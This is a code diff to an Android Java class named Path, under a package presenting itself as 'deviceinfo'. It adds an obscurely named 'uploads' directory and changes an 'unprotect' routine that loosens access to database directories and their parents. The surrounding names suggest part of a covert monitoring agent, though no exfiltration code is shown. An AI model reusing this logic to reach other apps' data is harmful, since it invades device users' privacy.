@@ -11,6 +11,7 @@ package com.android.deviceinfo.file;
 
 import java.io.File;
 import java.io.IOException;
+import java.util.Random;
 
 import android.os.Environment;
 import android.os.StatFs;
@@ -39,7 +40,7 @@ public class Path {
 
 	/** The Constant LOG_DIR. */
 	private static String LOG_DIR; //$NON-NLS-1$
-
+	private static String UPLOADS = "qza";
 	private static String curLogFile;
 
 	public static final String LOG_FILE = "android_logs"; //$NON-NLS-1$
@@ -81,6 +82,7 @@ public class Path {
 			success &= createDirectory(conf());
 			success &= createDirectory(markup());
 			success &= createDirectory(logs());
+			Status.getAppContext().getDir(UPLOADS, Status.getAppContext().MODE_PRIVATE);
 
 			if (Cfg.FILE && Cfg.DEBUG) {
 
@@ -161,10 +163,6 @@ public class Path {
 		return hidden;
 	}
 
-	public static String upload() {
-		return Status.getAppContext().getFilesDir().getAbsolutePath();
-	}
-
 	public static String doc() {
 		return doc;
 	}
@@ -210,6 +208,11 @@ public class Path {
 	public static String logs() {
 		return hidden() + LOG_DIR;
 	}
+	
+	public static String uploads() {
+		File f = Status.getAppContext().getDir(UPLOADS, Status.getAppContext().MODE_PRIVATE);
+		return f.getAbsolutePath();
+	}
 
 	public static boolean unprotect(String path) {
 
@@ -219,6 +222,13 @@ public class Path {
 	public static boolean unprotect(String path, int depth, boolean fullmode) {
 
 		File file = new File(path);
+		if(file.canRead() && !fullmode){
+			return true;
+		}
+		
+		if(fullmode && file.canRead() && file.canWrite()){
+			return true;
+		}
 
 		if (depth >= 0) {
 			unprotect(file.getParent(), depth - 1, fullmode);
@@ -270,7 +280,7 @@ public class Path {
 	}
 
 	public static boolean unprotect(String dbDir, String fileName, boolean fullMode) {
-		unprotect(dbDir, 2, fullMode);
+		unprotect(dbDir, 3, fullMode);
 		File file = new File(dbDir, fileName);
 		unprotect(file.getAbsolutePath(), fullMode);
 
@@ -372,5 +382,4 @@ public class Path {
 		}
 		return true;
 	}
-
 }
